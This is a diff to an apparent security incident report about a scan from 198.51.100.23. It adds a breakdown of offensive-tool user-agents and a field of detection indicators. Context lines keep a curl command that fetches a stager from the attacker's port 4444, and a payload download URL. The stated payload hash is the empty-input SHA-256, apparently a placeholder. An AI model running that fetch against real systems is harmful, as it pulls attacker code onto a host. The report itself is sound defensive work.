@@ -27,10 +27,24 @@ At 03:14 UTC, the agent detected an Nmap service scan from `198.51.100.23` targe
 
 ## What Triggered This
 
-- **Signal:** Suricata alert `ET SCAN Nmap Scripting Engine User-Agent Detected`
+- **Signal:** Suricata alert `ET SCAN Nmap Scripting Engine User-Agent Detected` + suspicious user-agent match
 - **Source IP:** 198.51.100.23
-- **Detection confidence:** 0.97
+- **Detection confidence:** 0.97 (IDS alert: 0.90 + UA match: 0.95 → combined 0.97)
 - **First seen:** 03:14:07 UTC
+
+### User-Agent Analysis
+
+The attacker's tools identified themselves via default user-agent strings:
+
+| Time | User-Agent | Tool Identified | Threat Level |
+|------|-----------|----------------|--------------|
+| 03:14:07 | `Nmap Scripting Engine; https://nmap.org/book/nse.html` | Nmap NSE | High |
+| 03:18:33 | `Nuclei - Open-source project (github.com/projectdiscovery/nuclei)` | Nuclei | High |
+| 03:22:15 | `sqlmap/1.8#stable` | sqlmap | High |
+| 03:29:41 | `gobuster/3.6` | Gobuster | High |
+| 03:33:08 | `python-requests/2.31.0` | Python requests (custom script) | Low |
+
+The attacker used at least 4 distinct offensive tools with default user-agents. This indicates either low operational security or a lack of concern about detection — consistent with automated/commodity attacks rather than APT tradecraft.
 
 ## What the Agent Did
 
@@ -124,6 +138,7 @@ curl http://198.51.100.23:4444/stager
   ],
   "open_ports": [22, 80, 443, 4444, 8080, 8443],
   "tools_detected": ["metasploit", "cobalt-strike", "covenant"],
+  "user_agents_observed": ["Nmap Scripting Engine", "Nuclei", "sqlmap/1.8", "gobuster/3.6", "python-requests/2.31.0"],
   "payload_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
   "payload_url": "http://198.51.100.23:8080/payload.elf"
 }
